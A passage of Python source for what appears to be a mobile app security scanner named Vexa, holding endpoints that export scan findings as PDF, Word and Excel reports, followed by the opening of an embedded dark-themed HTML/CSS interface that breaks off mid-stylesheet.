    styles.add(ParagraphStyle(name='FindingTitle', fontSize=12, leading=15, spaceAfter=4,
                               textColor=HexColor('#1f2328'), fontName='Helvetica-Bold'))
    styles.add(ParagraphStyle(name='SectH', fontSize=8.5, leading=11, spaceBefore=6, spaceAfter=2,
                               textColor=HexColor('#6e7781'), fontName='Helvetica-Bold'))
    styles.add(ParagraphStyle(name='Body', fontSize=10, leading=13, spaceAfter=4,
                               textColor=HexColor('#1f2328'), fontName='Helvetica'))
    styles.add(ParagraphStyle(name='Mono', fontSize=8.5, leading=11, fontName='Courier',
                               textColor=HexColor('#0a3069'), backColor=HexColor('#f6f8fa'),
                               borderPadding=6, leftIndent=4, rightIndent=4, spaceAfter=4))

    sev_color = {"critical": "#cf222e", "high": "#bc4c00", "medium": "#9a6700",
                 "low": "#1a7f37", "info": "#57606a"}
    risk_color = {"CRITICAL": "#cf222e", "HIGH": "#bc4c00", "MEDIUM": "#9a6700", "LOW": "#1a7f37"}[d["risk_label"]]

    story = []

    # Cover
    story.append(Spacer(1, 0.6*inch))
    story.append(Paragraph("SECURITY ASSESSMENT REPORT", styles['Sub']))
    story.append(Paragraph(html.escape(m.get("display_name") or m.get("package", "Unknown")),
                            styles['Title2']))
    story.append(Paragraph(
        f"<font face='Courier' size='10' color='#0969da'>{html.escape(m.get('package',''))}"
        + (f" &middot; v{html.escape(m.get('version_name',''))}" if m.get('version_name') else "")
        + "</font>", styles['Body']))
    story.append(Spacer(1, 0.3*inch))

    story.append(Paragraph(
        f"<b>Overall Risk:</b> <font color='{risk_color}' size='14'><b>{d['risk_label']}</b></font>",
        styles['Body']))
    story.append(Paragraph(f"Platform: {html.escape(d['platform'])}  &middot;  "
                            f"Generated {html.escape(d['when'])}", styles['Sub']))
    story.append(Spacer(1, 0.3*inch))

    # Severity table
    sev_data = [["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"],
                [str(s.get("critical",0)), str(s.get("high",0)), str(s.get("medium",0)),
                 str(s.get("low",0)), str(s.get("info",0))]]
    sev_table = Table(sev_data, colWidths=[1.3*inch]*5)
    sev_table.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,0), HexColor('#f6f8fa')),
        ('TEXTCOLOR', (0,0), (0,0), HexColor(sev_color['critical'])),
        ('TEXTCOLOR', (1,0), (1,0), HexColor(sev_color['high'])),
        ('TEXTCOLOR', (2,0), (2,0), HexColor(sev_color['medium'])),
        ('TEXTCOLOR', (3,0), (3,0), HexColor(sev_color['low'])),
        ('TEXTCOLOR', (4,0), (4,0), HexColor(sev_color['info'])),
        ('ALIGN', (0,0), (-1,-1), 'CENTER'),
        ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
        ('FONTSIZE', (0,0), (-1,0), 9),
        ('FONTSIZE', (0,1), (-1,1), 18),
        ('FONTNAME', (0,1), (-1,1), 'Helvetica-Bold'),
        ('TOPPADDING', (0,0), (-1,-1), 8),
        ('BOTTOMPADDING', (0,0), (-1,-1), 10),
        ('GRID', (0,0), (-1,-1), 0.5, HexColor('#d0d7de')),
    ]))
    story.append(sev_table)
    story.append(Spacer(1, 0.3*inch))

    # Executive Summary
    story.append(Paragraph("Executive Summary", styles['H2']))
    summary_text = (f"This assessment identified <b>{d['total']} security findings</b> across the "
                    f"application, including <b>{d['secrets_n']} hardcoded secret(s)</b>")
    if d['cves']:
        summary_text += f" and references to <b>{len(d['cves'])} known CVE(s)</b>"
    summary_text += (f". The overall risk rating is "
                     f"<font color='{risk_color}'><b>{d['risk_label']}</b></font>.")
    story.append(Paragraph(summary_text, styles['Body']))
    story.append(Spacer(1, 0.15*inch))

    # Application Metadata
    story.append(Paragraph("Application Metadata", styles['H2']))
    meta_rows = []
    for k, v in [("Package", m.get("package")), ("Version", m.get("version_name")),
                  ("Platform", d["platform"]),
                  ("Min SDK", m.get("min_sdk")), ("Target SDK", m.get("target_sdk")),
                  ("File", d["filename"]),
                  ("Size", f"{(m.get('apk_size_bytes') or 0)/1024/1024:.1f} MB" if m.get("apk_size_bytes") else "")]:
        if v not in (None, ""):
            meta_rows.append([Paragraph(f"<b>{html.escape(str(k))}</b>", styles['Body']),
                               Paragraph(html.escape(str(v)), styles['Body'])])
    if meta_rows:
        meta_table = Table(meta_rows, colWidths=[1.5*inch, 5.0*inch])
        meta_table.setStyle(TableStyle([
            ('VALIGN', (0,0), (-1,-1), 'TOP'),
            ('TOPPADDING', (0,0), (-1,-1), 4),
            ('BOTTOMPADDING', (0,0), (-1,-1), 4),
            ('LINEBELOW', (0,0), (-1,-1), 0.25, HexColor('#d0d7de')),
        ]))
        story.append(meta_table)
    story.append(Spacer(1, 0.2*inch))

    # CVE list
    if d['cves']:
        story.append(Paragraph("Known CVE References", styles['H2']))
        cves_p = "  ".join(f"<font face='Courier' color='#9a6700'>{html.escape(c)}</font>" for c in d['cves'])
        story.append(Paragraph(cves_p, styles['Body']))
        story.append(Spacer(1, 0.1*inch))

    # Findings, grouped by severity
    story.append(PageBreak())
    story.append(Paragraph("Findings", styles['H2']))

    sev_order = ["critical", "high", "medium", "low", "info"]
    grouped = {sv: [f for f in fs if f.get("severity") == sv] for sv in sev_order}

    fnum = 1
    for sv in sev_order:
        items = grouped[sv]
        if not items: continue
        story.append(Paragraph(
            f"<font color='{sev_color[sv]}'>{sv.upper()} ({len(items)})</font>",
            styles['H2']))
        for f in items:
            block = []
            tags = []
            if f.get("cvss"):  tags.append(f"<font color='{sev_color['critical']}'><b>CVSS {f['cvss']:.1f}</b></font>")
            if f.get("cve"):   tags.append(f"<font color='{sev_color['medium']}'>{html.escape(f['cve'])}</font>")
            if f.get("cwe"):   tags.append(f"<font color='#0969da'>{html.escape(f['cwe'])}</font>")
            if f.get("masvs"): tags.append(f"<font color='#57606a'>{html.escape(f['masvs'])}</font>")
            tag_line = "  &middot;  ".join(tags) if tags else ""

            block.append(Paragraph(
                f"<font color='{sev_color[sv]}'><b>F-{fnum:03d}</b></font> &nbsp; {html.escape(f.get('title',''))}",
                styles['FindingTitle']))
            if tag_line:
                block.append(Paragraph(tag_line, styles['Sub']))

            if f.get("description"):
                block.append(Paragraph("DESCRIPTION", styles['SectH']))
                block.append(Paragraph(html.escape(f["description"]), styles['Body']))
            if f.get("impact"):
                block.append(Paragraph("IMPACT", styles['SectH']))
                block.append(Paragraph(html.escape(f["impact"]), styles['Body']))
            if f.get("evidence"):
                ev = f["evidence"]
                if len(ev) > 600: ev = ev[:600] + "..."
                block.append(Paragraph("EVIDENCE", styles['SectH']))
                block.append(Paragraph(html.escape(ev).replace("\n", "<br/>"), styles['Mono']))
            fix = f.get("fix") or f.get("recommendation")
            if fix:
                block.append(Paragraph("REMEDIATION", styles['SectH']))
                block.append(Paragraph(html.escape(fix).replace("\n", "<br/>"), styles['Body']))
            if f.get("references"):
                block.append(Paragraph("REFERENCES", styles['SectH']))
                for url in f["references"][:5]:
                    block.append(Paragraph(
                        f"<font color='#0969da'>{html.escape(url)}</font>", styles['Body']))
            block.append(Spacer(1, 0.18*inch))
            try:
                story.append(KeepTogether(block))
            except Exception:
                story.extend(block)
            fnum += 1

    doc.build(story)
    pdf_bytes = buf.getvalue(); buf.close()
    safe_name = re.sub(r'[^a-zA-Z0-9_.-]', '_', m.get("package", "app"))
    return Response(content=pdf_bytes, media_type="application/pdf",
                    headers={"Content-Disposition": f'attachment; filename="vexa-{safe_name}.pdf"'})


@app.get("/api/scan/{sid}/report.docx")
async def report_docx(sid: str):
    """Word .docx export via python-docx."""
    try:
        from docx import Document
        from docx.shared import Pt, RGBColor, Inches
        from docx.enum.text import WD_ALIGN_PARAGRAPH
    except ImportError:
        raise HTTPException(503,
            "DOCX export requires python-docx. Install with: pip install python-docx")

    r = _load(sid)
    d = _report_summary_data(r)
    m, s, fs = d["metadata"], d["summary"], d["findings"]

    doc = Document()
    # Cover
    p = doc.add_paragraph(); p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = p.add_run("SECURITY ASSESSMENT REPORT")
    run.font.size = Pt(11); run.font.color.rgb = RGBColor(0x6e, 0x77, 0x81); run.bold = True

    h = doc.add_heading(m.get("display_name") or m.get("package", "Unknown"), level=0)
    h.alignment = WD_ALIGN_PARAGRAPH.CENTER

    p = doc.add_paragraph(); p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = p.add_run(m.get("package", "")); run.font.name = "Consolas"
    run.font.color.rgb = RGBColor(0x09, 0x69, 0xda)
    if m.get("version_name"):
        p.add_run(f"  ·  v{m['version_name']}")

    p = doc.add_paragraph(); p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    p.add_run("Overall Risk: ").bold = True
    risk_color = {"CRITICAL": RGBColor(0xcf,0x22,0x2e), "HIGH": RGBColor(0xbc,0x4c,0x00),
                  "MEDIUM": RGBColor(0x9a,0x67,0x00), "LOW": RGBColor(0x1a,0x7f,0x37)}[d["risk_label"]]
    risk_run = p.add_run(d["risk_label"]); risk_run.bold = True
    risk_run.font.size = Pt(14); risk_run.font.color.rgb = risk_color

    p = doc.add_paragraph(); p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    p.add_run(f"Platform: {d['platform']}  ·  Generated {d['when']}").italic = True

    doc.add_paragraph()

    # Severity summary table
    t = doc.add_table(rows=2, cols=5); t.style = "Light Grid Accent 1"
    headers = ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]
    for i, h_ in enumerate(headers):
        c = t.cell(0, i); c.text = h_
        c.paragraphs[0].runs[0].bold = True
    for i, k_ in enumerate(["critical","high","medium","low","info"]):
        c = t.cell(1, i); c.text = str(s.get(k_, 0))
        c.paragraphs[0].alignment = WD_ALIGN_PARAGRAPH.CENTER
        run = c.paragraphs[0].runs[0]; run.bold = True; run.font.size = Pt(16)
    doc.add_paragraph()

    # Executive summary
    doc.add_heading("Executive Summary", level=1)
    p = doc.add_paragraph()
    p.add_run(f"This assessment identified ")
    p.add_run(f"{d['total']} security findings").bold = True
    p.add_run(f" including ")
    p.add_run(f"{d['secrets_n']} hardcoded secret(s)").bold = True
    if d['cves']:
        p.add_run(" and ")
        p.add_run(f"{len(d['cves'])} known CVE reference(s)").bold = True
    p.add_run(".")

    # Metadata
    doc.add_heading("Application Metadata", level=1)
    mt = doc.add_table(rows=0, cols=2); mt.style = "Light List Accent 1"
    for k, v in [("Package", m.get("package")), ("Version", m.get("version_name")),
                  ("Platform", d["platform"]),
                  ("Min SDK", m.get("min_sdk")), ("Target SDK", m.get("target_sdk")),
                  ("File", d["filename"]),
                  ("Size", f"{(m.get('apk_size_bytes') or 0)/1024/1024:.1f} MB" if m.get('apk_size_bytes') else "")]:
        if v in (None, ""): continue
        row = mt.add_row().cells
        row[0].text = str(k); row[0].paragraphs[0].runs[0].bold = True
        row[1].text = str(v)

    if d['cves']:
        doc.add_heading("Known CVE References", level=1)
        p = doc.add_paragraph()
        for c in d['cves']:
            run = p.add_run(c + "  "); run.font.name = "Consolas"

    # Findings
    doc.add_heading("Findings", level=1)
    sev_order = ["critical","high","medium","low","info"]
    sev_color = {"critical": RGBColor(0xcf,0x22,0x2e), "high": RGBColor(0xbc,0x4c,0x00),
                 "medium": RGBColor(0x9a,0x67,0x00), "low": RGBColor(0x1a,0x7f,0x37),
                 "info": RGBColor(0x57,0x60,0x6a)}
    grouped = {sv: [f for f in fs if f.get("severity") == sv] for sv in sev_order}
    fnum = 1
    for sv in sev_order:
        items = grouped[sv]
        if not items: continue
        doc.add_heading(f"{sv.upper()} ({len(items)})", level=2)
        for f in items:
            p = doc.add_paragraph()
            r1 = p.add_run(f"F-{fnum:03d}  "); r1.bold = True; r1.font.color.rgb = sev_color[sv]
            r2 = p.add_run(f.get("title","")); r2.bold = True; r2.font.size = Pt(12)

            tags = []
            if f.get("cvss"):  tags.append(f"CVSS {f['cvss']:.1f}")
            if f.get("cve"):   tags.append(f["cve"])
            if f.get("cwe"):   tags.append(f["cwe"])
            if f.get("masvs"): tags.append(f["masvs"])
            if tags:
                tp = doc.add_paragraph()
                run = tp.add_run("  ·  ".join(tags)); run.italic = True
                run.font.color.rgb = RGBColor(0x57,0x60,0x6a)

            if f.get("description"):
                doc.add_paragraph().add_run("DESCRIPTION").bold = True
                doc.add_paragraph(f["description"])
            if f.get("impact"):
                doc.add_paragraph().add_run("IMPACT").bold = True
                doc.add_paragraph(f["impact"])
            if f.get("evidence"):
                doc.add_paragraph().add_run("EVIDENCE").bold = True
                ev = f["evidence"]
                if len(ev) > 600: ev = ev[:600] + "..."
                ep = doc.add_paragraph(); run = ep.add_run(ev); run.font.name = "Consolas"; run.font.size = Pt(9)
            fix = f.get("fix") or f.get("recommendation")
            if fix:
                doc.add_paragraph().add_run("REMEDIATION").bold = True
                doc.add_paragraph(fix)
            if f.get("references"):
                doc.add_paragraph().add_run("REFERENCES").bold = True
                for u in f["references"][:5]:
                    rp = doc.add_paragraph(); run = rp.add_run(u)
                    run.font.color.rgb = RGBColor(0x09,0x69,0xda); run.font.size = Pt(9)
            fnum += 1

    buf = io.BytesIO(); doc.save(buf)
    safe_name = re.sub(r'[^a-zA-Z0-9_.-]', '_', m.get("package", "app"))
    return Response(content=buf.getvalue(),
                    media_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                    headers={"Content-Disposition": f'attachment; filename="vexa-{safe_name}.docx"'})


@app.get("/api/scan/{sid}/report.xlsx")
async def report_xlsx(sid: str):
    """Excel .xlsx export via openpyxl."""
    try:
        from openpyxl import Workbook
        from openpyxl.styles import Font, PatternFill, Alignment, Border, Side
        from openpyxl.utils import get_column_letter
    except ImportError:
        raise HTTPException(503,
            "XLSX export requires openpyxl. Install with: pip install openpyxl")

    r = _load(sid)
    d = _report_summary_data(r)
    m, s, fs = d["metadata"], d["summary"], d["findings"]

    wb = Workbook()
    # --- Summary sheet ---
    ws = wb.active; ws.title = "Summary"
    ws['A1'] = "Vexa Security Assessment"
    ws['A1'].font = Font(size=18, bold=True, color="1F2328")
    ws['A2'] = m.get("display_name") or m.get("package","")
    ws['A2'].font = Font(size=14, bold=True, color="0969DA")
    ws['A3'] = f"Generated {d['when']}"
    ws['A3'].font = Font(italic=True, color="6E7781")

    ws['A5'] = "Overall Risk:"; ws['A5'].font = Font(bold=True)
    ws['B5'] = d["risk_label"]
    risk_color = {"CRITICAL":"CF222E","HIGH":"BC4C00","MEDIUM":"9A6700","LOW":"1A7F37"}[d["risk_label"]]
    ws['B5'].font = Font(bold=True, size=14, color=risk_color)

    headers = [("Critical","CF222E"), ("High","BC4C00"), ("Medium","9A6700"),
               ("Low","1A7F37"), ("Info","57606A")]
    for i, (label, color) in enumerate(headers):
        c1 = ws.cell(row=7, column=i+1, value=label.upper())
        c1.font = Font(bold=True, color=color, size=10)
        c1.fill = PatternFill("solid", fgColor="F6F8FA")
        c1.alignment = Alignment(horizontal='center')
        c2 = ws.cell(row=8, column=i+1, value=s.get(label.lower(), 0))
        c2.font = Font(bold=True, size=18, color=color)
        c2.alignment = Alignment(horizontal='center')

    # Metadata block
    ws['A11'] = "Application Metadata"; ws['A11'].font = Font(bold=True, size=12)
    row = 12
    for k, v in [("Package", m.get("package")), ("Version", m.get("version_name")),
                  ("Platform", d["platform"]),
                  ("Min SDK", m.get("min_sdk")), ("Target SDK", m.get("target_sdk")),
                  ("File", d["filename"]),
                  ("Size", f"{(m.get('apk_size_bytes') or 0)/1024/1024:.1f} MB" if m.get("apk_size_bytes") else "")]:
        if v in (None, ""): continue
        ws.cell(row=row, column=1, value=k).font = Font(bold=True, color="6E7781")
        ws.cell(row=row, column=2, value=str(v))
        row += 1

    if d['cves']:
        row += 1
        ws.cell(row=row, column=1, value="Known CVE References").font = Font(bold=True, size=12)
        row += 1
        for cve in d['cves']:
            ws.cell(row=row, column=1, value=cve).font = Font(name="Consolas", color="9A6700")
            row += 1

    # Column widths
    for col, w in [('A', 18), ('B', 60), ('C', 12), ('D', 12), ('E', 12)]:
        ws.column_dimensions[col].width = w

    # --- Findings sheet ---
    ws2 = wb.create_sheet("Findings")
    cols = ["#", "Severity", "Title", "CVSS", "CVE", "CWE", "MASVS",
            "Description", "Impact", "Evidence", "Remediation", "References", "Confidence"]
    for i, c in enumerate(cols):
        cell = ws2.cell(row=1, column=i+1, value=c)
        cell.font = Font(bold=True, color="FFFFFF")
        cell.fill = PatternFill("solid", fgColor="24292F")
        cell.alignment = Alignment(horizontal='left', vertical='center')

    sev_color = {"critical":"CF222E","high":"BC4C00","medium":"9A6700","low":"1A7F37","info":"57606A"}
    for i, f in enumerate(fs):
        rownum = i + 2
        sev = f.get("severity","")
        ws2.cell(row=rownum, column=1, value=f"F-{i+1:03d}").font = Font(bold=True)
        sev_cell = ws2.cell(row=rownum, column=2, value=sev.upper())
        sev_cell.font = Font(bold=True, color=sev_color.get(sev,"57606A"))
        ws2.cell(row=rownum, column=3, value=f.get("title",""))
        ws2.cell(row=rownum, column=4, value=f.get("cvss") or "")
        ws2.cell(row=rownum, column=5, value=f.get("cve") or "")
        ws2.cell(row=rownum, column=6, value=f.get("cwe") or "")
        ws2.cell(row=rownum, column=7, value=f.get("masvs") or "")
        ws2.cell(row=rownum, column=8, value=f.get("description",""))
        ws2.cell(row=rownum, column=9, value=f.get("impact",""))
        ev = f.get("evidence","")
        if len(ev) > 1000: ev = ev[:1000] + "..."
        ws2.cell(row=rownum, column=10, value=ev)
        ws2.cell(row=rownum, column=11, value=f.get("fix") or f.get("recommendation",""))
        ws2.cell(row=rownum, column=12, value="\n".join((f.get("references") or [])[:5]))
        ws2.cell(row=rownum, column=13, value=f.get("confidence",""))
        for c in range(1, 14):
            ws2.cell(row=rownum, column=c).alignment = Alignment(wrap_text=True, vertical='top')

    widths = {1:7, 2:11, 3:48, 4:8, 5:18, 6:12, 7:14, 8:50, 9:50, 10:50, 11:50, 12:55, 13:11}
    for col, w in widths.items():
        ws2.column_dimensions[get_column_letter(col)].width = w
    ws2.freeze_panes = "A2"

    # --- Secrets sheet (separate, since it's a high-value list) ---
    secrets = [f for f in fs if f.get("id","").startswith("secret-") or f.get("id","").startswith("ios-secret-")]
    if secrets:
        ws3 = wb.create_sheet("Secrets")
        sec_cols = ["#", "Severity", "Type", "Evidence", "CVSS", "CWE", "Impact", "Fix"]
        for i, c in enumerate(sec_cols):
            cell = ws3.cell(row=1, column=i+1, value=c)
            cell.font = Font(bold=True, color="FFFFFF")
            cell.fill = PatternFill("solid", fgColor="CF222E")
        for i, f in enumerate(secrets):
            rownum = i + 2
            ws3.cell(row=rownum, column=1, value=f"S-{i+1:03d}")
            ws3.cell(row=rownum, column=2, value=(f.get("severity","")).upper())
            ws3.cell(row=rownum, column=3, value=f.get("title","").replace("Hardcoded secret: ",""))
            ws3.cell(row=rownum, column=4, value=f.get("evidence",""))
            ws3.cell(row=rownum, column=5, value=f.get("cvss") or "")
            ws3.cell(row=rownum, column=6, value=f.get("cwe") or "")
            ws3.cell(row=rownum, column=7, value=f.get("impact",""))
            ws3.cell(row=rownum, column=8, value=f.get("fix") or f.get("recommendation",""))
            for c in range(1, 9):
                ws3.cell(row=rownum, column=c).alignment = Alignment(wrap_text=True, vertical='top')
        for col, w in {1:7, 2:11, 3:30, 4:60, 5:8, 6:12, 7:50, 8:55}.items():
            ws3.column_dimensions[get_column_letter(col)].width = w
        ws3.freeze_panes = "A2"

    buf = io.BytesIO(); wb.save(buf)
    safe_name = re.sub(r'[^a-zA-Z0-9_.-]', '_', m.get("package", "app"))
    return Response(content=buf.getvalue(),
                    media_type="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                    headers={"Content-Disposition": f'attachment; filename="vexa-{safe_name}.xlsx"'})

# =============================================================================
# Embedded frontend
# =============================================================================
INDEX_HTML = r"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Vexa</title>
<style>
:root{
  color-scheme: dark;
  --bg:        #0d1117;
  --panel:     #161b22;
  --panel-2:   #1c2128;
  --border:    #30363d;
  --border-2:  #21262d;
  --text:      #e6edf3;
  --text-2:    #c9d1d9;
  --muted:     #8b949e;
  --muted-2:   #6e7681;
  --accent:    #2f81f7;
  --accent-2:  #58a6ff;
  --good:      #3fb950;
  --warn:      #d29922;
  --bad:       #f85149;

  --crit:      #f85149;
  --high:      #db6d28;
  --med:       #d29922;
  --low:       #2f81f7;
  --info:      #6e7681;

  --mono: ui-monospace, "SF Mono", "JetBrains Mono", "Cascadia Code", Consolas, "Liberation Mono", monospace;
  --sans: -apple-system, BlinkMacSystemFont, "Segoe UI", "Helvetica Neue", Arial, sans-serif;
}

/* ===== LIGHT THEME ===== */
[data-theme="light"]{
  color-scheme: light;
  --bg:        #f6f8fa;
  --panel:     #ffffff;
  --panel-2:   #f0f2f5;
  --border:    #d0d7de;
  --border-2:  #e1e4e8;
  --text:      #1f2328;
  --text-2:    #33383f;
  --muted:     #57606a;
  --muted-2:   #6e7781;
  --accent:    #0969da;
  --accent-2:  #0550ae;
  --good:      #1a7f37;
  --warn:      #9a6700;
  --bad:       #cf222e;

  --crit:      #cf222e;
  --high:      #bc4c00;
  --med:       #9a6700;
  --low:       #0969da;
  --info:      #6e7781;
}
[data-theme="light"] ::-webkit-scrollbar-thumb{background:#c8cdd3}
[data-theme="light"] ::-webkit-scrollbar-thumb:hover{background:#a8adb3}

/* Theme toggle button */
.theme-toggle{
  background: none; border: 1px solid var(--border); border-radius: 6px;
  color: var(--muted); cursor: pointer; padding: 5px 8px; font-size: 14px;
  line-height:1; transition: all .15s; margin-left: 4px;
}
.theme-toggle:hover{ color: var(--text); border-color: var(--accent); background: var(--panel-2); }

*{box-sizing:border-box;margin:0;padding:0}
html, body{height:100%}
body{
  font: 13px/1.5 var(--sans);
  background: var(--bg);
  color: var(--text);
  overflow: hidden;
}
button, input, select, textarea{font: inherit; color: inherit}
a{color: var(--accent-2); text-decoration: none}
a:hover{text-decoration: underline}
::-webkit-scrollbar{width:10px;height:10px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:#30363d;border-radius:5px}
::-webkit-scrollbar-thumb:hover{background:#484f58}

/* ========== App shell ========== */
.app{
  display:grid;
  grid-template-columns: 240px 1fr;
  grid-template-rows: 44px 1fr 24px;
  grid-template-areas:
    "topbar topbar"
    "sidebar main"
    "statusbar statusbar";
  height: 100vh;
}

/* ========== Top bar ========== */
.topbar{
  grid-area: topbar;
  background: var(--panel);
  border-bottom: 1px solid var(--border);
  display:flex; align-items:center; padding: 0 20px; gap: 16px;
  height: 56px;
}
.brand{display:flex; align-items:center; gap:12px; font-weight:600; letter-spacing:.3px}
.brand .logo{
  width:32px; height:32px;
  display:grid; place-items:center;
  filter: drop-shadow(0 2px 6px rgba(47,129,247,.35));
  flex-shrink: 0;
}
.brand .logo svg{width:100%; height:100%; display:block}
.brand-name{font-size:16px; font-weight:700; letter-spacing:.4px}
.brand-tag{font-size:10px; color:var(--muted); margin-left:6px; text-transform:uppercase;
  letter-spacing:1.4px; font-weight:600; padding:3px 9px;
  background:var(--panel-2); border:1px solid var(--border); border-radius:4px;
}
.topbar-spacer{flex:1}
.topbar-right{display:flex; gap:6px; align-items:center}
.env-pill{
  display:inline-flex; align-items:center; gap:6px;
  font-size:11px; color:var(--text-2);
  background: var(--panel-2); border: 1px solid var(--border-2);
  border-radius: 4px; padding: 5px 10px;
  font-family: var(--mono); height: 26px;
}
.env-pill .dot{width:6px; height:6px; border-radius:50%; background: var(--muted-2)}
.env-pill.on .dot{background: var(--good); box-shadow: 0 0 6px var(--good)}
.env-pill.off .dot{background: var(--muted-2)}

/* ========== Sidebar ========== */
.sidebar{
  grid-area: sidebar;
  background: var(--panel);
  border-right: 1px solid var(--border);
  overflow-y: auto;
  display: flex; flex-direction: column;
}
.side-section{padding: 12px 4px 4px}
.side-label{
  font-size:10px; text-transform:uppercase; letter-spacing:1.4px;
  color: var(--muted-2); padding: 4px 12px; font-weight:600;
}
.side-nav{display:flex; flex-direction:column}
.nav-item{
  display:flex; align-items:center; gap:10px;
  padding: 7px 12px; cursor:pointer;
  color: var(--text-2); font-size:13px;
  border-left: 2px solid transparent;
  user-select: none;
}
.nav-item:hover{background: var(--panel-2); color: var(--text)}
.nav-item.active{
  background: var(--panel-2); color: var(--text);
  border-left-color: var(--accent);
  font-weight: 500;
}
.nav-item .ico{width:16px; text-align:center; font-size:13px; opacity:.85}
.nav-item .badge{
  margin-left:auto; font-size:10px; font-family: var(--mono);
  background: var(--bg); border:1px solid var(--border-2);
  padding: 1px 5px; border-radius: 3px; color: var(--muted);
}
.nav-item.active .badge{color: var(--text)}
.nav-item.nav-highlight{
  background: linear-gradient(90deg, rgba(47,129,247,.08), transparent 70%);
  font-weight: 500;
}
.nav-item.nav-highlight .ico{color: var(--accent-2); opacity: 1}
.badge.accent{
  background: rgba(47,129,247,.15);
  border-color: rgba(47,129,247,.4);
  color: var(--accent-2);
}
.btn-icon{
  background:transparent; border:0; color:var(--muted); cursor:pointer;
  font-size:14px; padding:2px 6px; border-radius:4px;
}
.btn-icon:hover{background:var(--panel-2); color:var(--text)}

.scan-block{flex:1; overflow-y:auto; padding-bottom:8px}
.scan-item{
  padding: 0; cursor:pointer;
  border-left: 2px solid transparent;
  font-size: 12px;
  border-bottom: 1px solid var(--border-2);
  display: flex; align-items: stretch;
  position: relative;
}
.scan-item-content{
  flex: 1; min-width: 0; padding: 8px 4px 8px 12px;
}
.scan-item-del{
  background: transparent; border: 0;
  color: var(--muted); cursor: pointer;
  padding: 0 12px; font-size: 16px; line-height: 1;
  opacity: 0; transition: opacity .12s, color .12s, background .12s;
  border-left: 1px solid transparent;
}
.scan-item:hover .scan-item-del{opacity: .6}
.scan-item-del:hover{
  opacity: 1 !important; color: var(--bad);
  background: rgba(248,81,73,.08);
  border-left-color: rgba(248,81,73,.2);
}
.scan-item:hover{background: var(--panel-2)}
.scan-item.active{background: var(--panel-2); border-left-color: var(--accent)}
.scan-item .pkg{
  font-family: var(--mono); font-size: 11px;
  white-space:nowrap; overflow:hidden; text-overflow:ellipsis;
  margin-bottom: 3px;
}
.scan-item .meta{font-size:10px; color: var(--muted); display:flex; gap:6px; align-items:center}
.scan-item .severity-bar{
  display:flex; height:3px; margin-top:5px; border-radius: 2px; overflow:hidden;
  background: var(--border-2);
}
.scan-item .severity-bar > span{display:block}
.sev-c{background: var(--crit)} .sev-h{background: var(--high)}
.sev-m{background: var(--med)} .sev-l{background: var(--low)}

.side-foot{
  border-top: 1px solid var(--border);
  padding: 8px 12px;
  font-size: 11px; color: var(--muted); font-family: var(--mono);
  display:flex; justify-content:space-between;
}

/* Platform filter pills under "Saved Scans" */
.btn-pill{
  flex: 1;
  padding: 4px 8px;
  font-size: 11px;
  background: transparent;
  border: 1px solid var(--border);
  border-radius: 12px;
  color: var(--muted);
  cursor: pointer;
  transition: all .12s;
  font-family: var(--mono);
}
.btn-pill:hover{ border-color: var(--accent); color: var(--text2) }
.btn-pill.active{
  background: var(--accent-bg, rgba(47,129,247,.12));
  border-color: var(--accent);
  color: var(--accent-2, #58a6ff);
  font-weight: 600;
}

/* Key-value table used in iOS Info.plist / Entitlements panes */
.kv-table{
  display: flex; flex-direction: column; gap: 1px;
  background: var(--border);
  border: 1px solid var(--border);
  border-radius: 6px; overflow: hidden;
  font-family: var(--mono);
  font-size: 12.5px;
}
.kv-row{
  display: grid; grid-template-columns: minmax(180px, 1fr) 3fr;
  gap: 12px;
  padding: 8px 12px;
  background: var(--bg-2, var(--bg));
}
.kv-row:hover{ background: var(--bg-3, var(--bg-2)) }
.kv-key{ color: var(--accent-2, #58a6ff); font-weight: 600; word-break: break-word }
.kv-val{ color: var(--text); white-space: pre-wrap; word-break: break-word }

/* ========== Main ========== */
.main{
  grid-area: main;
  overflow: hidden;
  display: flex; flex-direction: column;
}

/* ========== Welcome ========== */
.welcome{
  flex:1; display:flex; align-items:center; justify-content:center;
  padding: 40px 24px; overflow-y:auto;
}
.welcome-card{
  max-width: 760px; width: 100%;
  text-align: center;
}
.brand-mark{
  width: 76px; height: 76px; margin: 0 auto 18px;
  display: flex; align-items: center; justify-content: center;
  filter: drop-shadow(0 6px 24px rgba(47,129,247,.4));
}
.brand-mark svg{width:100%; height:100%; display:block}
.welcome-card h1{
  font-size: 26px; font-weight: 700; margin-bottom: 8px;
  background: linear-gradient(135deg, #e6edf3 0%, #8b949e 100%);
  -webkit-background-clip: text; -webkit-text-fill-color: transparent;
  background-clip: text;
}
.welcome-card .lead{color: var(--muted); margin-bottom: 24px; font-size:14px; line-height:1.6}

/* Platform tabs (Android / iOS) — selected before upload */
.platform-tabs{
  display: flex; gap: 12px; margin-bottom: 18px;
}
.plat-tab{
  flex: 1; padding: 14px 16px;
  background: var(--panel-2); border: 1px solid var(--border); border-radius: 10px;
  color: var(--muted); cursor: pointer; transition: all .15s;
  display: flex; flex-direction: column; align-items: flex-start; gap: 4px;
}
.plat-tab:hover{ border-color: var(--accent); color: var(--text2) }
.plat-tab.active{
  border-color: var(--accent);
  background: rgba(47,129,247,.08);
  color: var(--text);
  box-shadow: 0 0 0 3px rgba(47,129,247,.15);
}
.plat-tab .plat-icon{ font-size: 22px; }
.plat-tab .plat-label{ font-size: 15px; font-weight: 700; }
.plat-tab .plat-meta{ font-size: 11px; color: var(--muted); font-family: var(--mono); }
.plat-tab.active .plat-meta{ color: var(--accent-2, #58a6ff); }

/* Cap-grid item dimming when not on the active platform */
.cap.cap-dimmed{ opacity: 0.45 }

/* Source mode tabs */
.source-tabs{
  display:flex; gap:0; margin-bottom: 18px;
  background: var(--panel-2); border: 1px solid var(--border);
  border-radius: 8px; padding: 4px;
}
.src-tab{
  flex: 1; padding: 8px 14px; font-size: 13px; font-weight: 600;
